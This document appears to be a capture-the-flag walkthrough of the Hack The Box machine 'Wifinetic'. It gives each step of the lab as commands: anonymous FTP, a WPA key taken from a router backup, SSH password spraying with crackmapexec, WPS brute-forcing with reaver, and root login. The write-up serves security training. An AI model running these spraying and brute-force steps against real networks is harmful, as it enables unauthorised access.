## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)](Easy)

## 🧭 Recon

### Nmap
```bash
nmap -p- --min-rate 10000 10.10.11.247
nmap -p 21,22,53 -sCV 10.10.11.247
nmap -sU --top 10 10.10.11.247
```

---

## 📁 [FTP](FTP) Enumeration

### Anonymous Login
```bash
ftp 10.10.11.247
# Use username: anonymous
```

### Download Files
```ftp
prompt off
mget *
```

---

## 🔍 File Review

- **backup-OpenWrt-2023-07-26.tar** → Extract and review WiFi config for WPA key:
```bash
tar xf backup-OpenWrt-2023-07-26.tar
cat etc/config/wireless
```

Look for lines like:
```
option key 'VeRyUniUqWiFIPasswrd1!'
```

---

## 📡 [DNS](DNS) Recon (TCP/UDP 53)

### Add Hosts Entry
```bash
echo "10.10.11.247 wifinetic.htb" | sudo tee -a /etc/hosts
```

---

## 👤 Shell as `netadmin`

### Bruteforce SSH Login with Known Password
Create user file `users` with contents from `/etc/passwd`:
```bash
crackmapexec ssh 10.10.11.247 -u users -p 'VeRyUniUqWiFIPasswrd1!' --continue-on-success
```

### SSH In
```bash
sshpass -p 'VeRyUniUqWiFIPasswrd1!' ssh netadmin@10.10.11.247
```

---

## 🔍 Internal Enumeration

### Wireless Interfaces
```bash
ifconfig
iw dev
```

### Wireless Config (permissions restricted)
```bash
cat /etc/wpa_supplicant.conf
```

### SetUID & Capabilities
```bash
find / -perm -4000 -or -perm -2000 2>/dev/null
getcap -r / 2>/dev/null
```

Look for:
```
/usr/bin/reaver = cap_net_raw+ep
```

---

## 📶 WPA Brute Force – Reaver

### Target Details
- **Monitor Interface**: `mon0`
- **Target BSSID (AP MAC)**: `02:00:00:00:00:00`
- **Channel**: 1
- **SSID**: `OpenWrt`

### Run Reaver
```bash
reaver -i mon0 -b 02:00:00:00:00:00 -vv
```

Expect:
```
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
```

---

## 👑 Root Access

### Become Root via `su`
```bash
su -
# Password: WhatIsRealAnDWhAtIsNot51121!
```

### Or [SSH](SSH) as Root
```bash
sshpass -p 'WhatIsRealAnDWhAtIsNot51121!' ssh root@10.10.11.247
```

---

## 🔬 Beyond Root – Wash Analysis

### Why `wash -i mon0` hangs:
- `mon0` is monitor-mode and can **sniff** but not transmit.
- `wash` relies on **sending a probe** + sniffing response.
- Use `wlan2` instead for sending:
```bash
wash -i wlan2
```

### Both interfaces receive response:
- Running `wash -i wlan2` allows `wash -i mon0` to print results too (shared PHY).
